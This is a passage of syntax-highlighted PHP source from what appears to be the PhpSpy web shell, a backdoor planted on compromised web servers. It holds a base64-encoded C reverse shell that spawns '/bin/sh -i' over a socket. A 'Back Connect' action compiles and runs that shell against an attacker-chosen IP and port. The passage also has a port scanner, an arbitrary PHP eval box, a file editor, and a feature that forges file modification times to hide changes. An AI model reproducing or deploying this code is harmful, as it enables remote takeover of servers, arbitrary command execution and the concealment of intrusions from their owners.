<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M</span><span style="color: #8abeb7; text-decoration: underline;">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z</span><span style="color: #8abeb7; text-decoration: underline;">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp"</span><span style="text-decoration: underline;">.</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB</span><span style="color: #8abeb7; text-decoration: underline;">jbG9zZShmZCk7IA0KfQ=="</span><span style="text-decoration: underline;">;</span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">start</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourip</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourport</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">use</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">use</span> == <span style="color: #8abeb7;">'perl'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   cf(<span style="color: #8abeb7;">'/tmp/angel_bc'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">back_connect</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = execute(which(<span style="color: #8abeb7;">'perl'</span>).<span style="color: #8abeb7;">" /tmp/angel_bc </span><span style="color: #f0c674;">$yourip</span><span style="color: #8abeb7;"> </span><span style="color: #f0c674;">$yourport</span><span style="color: #8abeb7;"> &amp;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   cf(<span style="color: #8abeb7;">'/tmp/angel_bc.c'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">back_connect_c</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = execute(<span style="color: #8abeb7;">'gcc -o /tmp/angel_bc /tmp/angel_bc.c'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@unlink</span>(<span style="color: #8abeb7;">'/tmp/angel_bc.c'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = execute(<span style="color: #8abeb7;">"/tmp/angel_bc </span><span style="color: #f0c674;">$yourip</span><span style="color: #8abeb7;"> </span><span style="color: #f0c674;">$yourport</span><span style="color: #8abeb7;"> &amp;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">"Now script try connect to </span><span style="color: #f0c674;">$yourip</span><span style="color: #8abeb7;"> port </span><span style="color: #f0c674;">$yourport</span><span style="color: #8abeb7;"> ..."</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Back Connect'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'backconnect'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'Your IP:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'yourip'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;20,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourip</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'Your Port:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'yourport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;15,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">yourport</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'Use:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeselect(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'use'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">usedb</span>,<span style="color: #8abeb7;">'selected'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">use</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'start'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Start'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span>=&gt;<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">bt'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'portscan'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanip</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanip</span> = <span style="color: #8abeb7;">'127.0.0.1'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanport</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanport</span> = <span style="color: #8abeb7;">'21,25,80,110,135,139,445,1433,3306,3389,5631,4395</span><span style="color: #8abeb7; text-decoration: underline;">8'</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Port Scan'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'portscan'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'IP:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'scanip'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;20,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanip</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'Port:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'scanport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;80,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanport</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'startscan'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Scan'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">startscan</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;ul class="info"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(explode(<span style="color: #8abeb7;">','</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanport</span>) <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">port</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span> = <span style="color: #81a2be;">@fsockopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanip</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">port</span>, &amp;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errno</span>, &amp;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">errstr</span>, 1);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;li&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanip</span>.<span style="color: #8abeb7;">':'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">port</span>.<span style="color: #8abeb7;">' ------------------------ &lt;span styl</span><span style="color: #8abeb7; text-decoration: underline;">e="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>  } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;li&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scanip</span>.<span style="color: #8abeb7;">':'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">port</span>.<span style="color: #8abeb7;">' ------------------------ &lt;span styl</span><span style="color: #8abeb7; text-decoration: underline;">e="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>  }<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/ul&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'eval'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpcode</span> = trim(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpcode</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpcode</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>preg_match(<span style="color: #8abeb7;">'#&lt;\?#si'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpcode</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpcode</span> = <span style="color: #8abeb7;">"&lt;?php\n\n</span><span style="color: #f0c674;">{$phpcode}</span><span style="color: #8abeb7;">\n\n?&gt;"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">eval</span>(<span style="color: #8abeb7;">"?"</span>.<span style="color: #8abeb7;">"&gt;</span><span style="color: #f0c674;">$phpcode</span><span style="color: #8abeb7;">&lt;?"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Eval PHP Code'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'eval'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   maketext(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'PHP Code'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'phpcode'</span>, <span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpcode</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;&lt;a href="http://w'</span>.<span style="color: #8abeb7;">'ww.4ng'</span>.<span style="color: #8abeb7;">'el.net/php'</span>.<span style="color: #8abeb7;">'spy/pl'</span>.<span style="color: #8abeb7;">'ugin/" target="_bla</span><span style="color: #8abeb7; text-decoration: underline;">nk"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfooter();
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end eval</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'editfile'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfile</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfile</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>=<span style="color: #81a2be;">@fread</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>, filesize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfile</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>=htmlspecialchars(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Create / Edit File'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Current File (import new file name and new file)'</span>,<span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'editfilename'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   maketext(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'File Content'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'filecontent'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">conte</span><span style="color: #f0c674; text-decoration: underline;">nts</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfooter();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   goback();

}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end editfile</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'newtime'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfilemtime</span> = <span style="color: #81a2be;">@filemtime</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfile</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">$time = strtotime("$year-$month-$day $hour:$minute:$second");</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cachemonth</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'January'</span>=&gt;1,<span style="color: #8abeb7;">'February'</span>=&gt;2,<span style="color: #8abeb7;">'March'</span>=&gt;3,<span style="color: #8abeb7;">'April'</span>=&gt;4,<span style="color: #8abeb7;">'May'</span>=&gt;<span style="text-decoration: underline;">5,</span><span style="color: #8abeb7; text-decoration: underline;">'June'</span><span style="text-decoration: underline;">=&gt;6,</span><span style="color: #8abeb7; text-decoration: underline;">'July'</span><span style="text-decoration: underline;">=&gt;7,</span><span style="color: #8abeb7; text-decoration: underline;">'August'</span><span style="text-decoration: underline;">=&gt;8,</span><span style="color: #8abeb7; text-decoration: underline;">'September'</span><span style="text-decoration: underline;">=&gt;9,</span><span style="color: #8abeb7; text-decoration: underline;">'October'</span><span style="text-decoration: underline;">=&gt;10,</span><span style="color: #8abeb7; text-decoration: underline;">'November'</span><span style="text-decoration: underline;">=&gt;11,</span><span style="color: #8abeb7; text-decoration: underline;">'December'</span><span style="text-decoration: underline;">=&gt;12);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Clone folder/file was last modified time'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Alter folder/file'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'curfile'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opf</span><span style="color: #f0c674; text-decoration: underline;">ile</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;120,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Reference folder/file (fullpath)'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'tarfile</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;120,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfooter();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Set last modified'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dir'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Current folder/file (fullpath)'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'curfile'</span>,<span style="color: #8abeb7; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;120,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;year:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'year'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;date(<span style="color: #8abeb7;">'Y'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">opfilemtime</span>),<span style="color: #8abeb7;">'size'</span>=&gt;4));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'month:'</span>);
